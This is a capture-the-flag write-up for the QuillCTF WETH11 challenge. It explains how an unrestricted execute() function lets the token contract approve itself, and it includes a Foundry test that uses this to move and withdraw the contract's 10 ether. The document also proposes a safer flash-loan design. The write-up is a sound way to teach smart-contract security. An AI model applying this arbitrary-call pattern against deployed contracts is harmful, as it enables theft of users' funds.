### Challenge Solution QuillCTF - WETH11

#### Description

Since the tokens deposited were ERC20 tokens and assigned to the weth address it means that the weth contract has those 10 ether in its ERC20 balance.
The contract can use the ERC20 functions as if it was a user. The only required action is to force the contract to call the needed functions and that would allow us to subtract the tokens.

This contract allows any user to call the function execute which is supposed to be used for flash loans using the weth token but this is not a common practice of how flash loans work.

#### Possible solutions

Usually platforms like aave and uniswap enable flash loans in a different way, there could be a user contract that calls the weth contract to ask for a flash loan, then the weth contract would use a callback function inside the user contract which performs the logic of the flashloan. At the end of the transaction the function will require the balance of the contract to be equal or greater than before. In this approach the logic of the flash loan would run in the context of the user contract not in the context of the weth contract. It would be similar to the function executeOperation() of aave.
https://docs.aave.com/developers/guides/flash-loans

#### Attack steps

For the attack we need the weth contract to call the function approve(bob, 10 ether).

Fortunately, we have the function execute() that will help us to do this, the params will be the weth address so that it interacts with itself, then 0 amount and finally the bytes data for a call to the function approve.

For the bytes of the data you can encode the data like this:
` abi.encodeWithSelector(IERC20.approve.selector, bob, 10 ether)`
This call will make the weth contract approve bob to use the 10 ether tokens located in the weth contract.

The balance of the contract is not altered by the approve function so the function execute will pass the last verification of the balance.

Finally bob calls the function transferFrom to move the approved tokens to his own address.

Note: Anyone could have claimed these tokens or any other amount of tokens deposited by accident not only bob. So, in a real scenario bob would need to run this as soon as possible.

#### Code

```solidity
// SPDX-License-Identifier: Manija
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

import "../src/WETH11.sol";

contract Weth11Test is Test {
    WETH11 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH11();
        bob = makeAddr("bob");

        vm.deal(address(bob), 10 ether);
        vm.startPrank(bob);
        weth.deposit{value: 10 ether}();
        weth.transfer(address(weth), 10 ether);
        vm.stopPrank();
    }

    function testHack() public {
        assertEq(weth.balanceOf(address(weth)), 10 ether, "weth contract should have 10 ether");

        vm.startPrank(bob);

        // ========= Recovery code =========
        bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, bob, 10 ether);
        weth.execute(address(weth), 0, data);
        weth.transferFrom(address(weth), bob, 10 ether);
        weth.withdrawAll();
        // =================================

        vm.stopPrank();

        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(weth.balanceOf(address(weth)), 0, "empty weth on weth contract");

        assertEq(bob.balance, 10 ether, "player should recover initial 10 ethers");
    }
}
```
